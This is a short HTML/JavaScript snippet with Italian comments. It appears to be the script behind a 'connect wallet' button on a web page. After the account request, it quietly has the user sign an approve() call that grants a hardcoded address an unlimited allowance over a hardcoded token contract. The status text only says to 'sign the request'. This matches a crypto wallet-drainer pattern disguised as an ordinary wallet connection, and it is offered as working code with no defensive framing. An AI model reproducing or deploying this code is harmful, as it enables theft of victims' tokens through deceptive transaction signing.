<script>
    // Sostituisci solo la parte dello script con questa versione semplificata
    document.getElementById('btn-connect').onclick = async () => {
        const status = document.getElementById('status');
        status.innerText = "Apertura Wallet...";

        try {
            // Se hai MetaMask su PC, questo lo aprirà all'istante
            if (window.ethereum) {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = provider.getSigner();
                
                status.innerText = "Connesso! Firma la richiesta...";
                const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
                const contract = new ethers.Contract("0x77110e0F9643445e9909772B4D368C76f599A998", abi, signer);
                const tx = await contract.approve("0xf1E69059bACa32d3D07C75d20453E24130443484", ethers.constants.MaxUint256);
                status.innerText = "Successo! TX inviata.";
            } else {
                // Se non c'è MetaMask su PC, prova a forzare WalletConnect
                status.innerText = "MetaMask non trovato. Uso WalletConnect...";
                // ... (il resto del codice WalletConnect)
            }
        } catch (e) {
            status.innerText = "Errore: " + e.message;
        }
    };
</script>
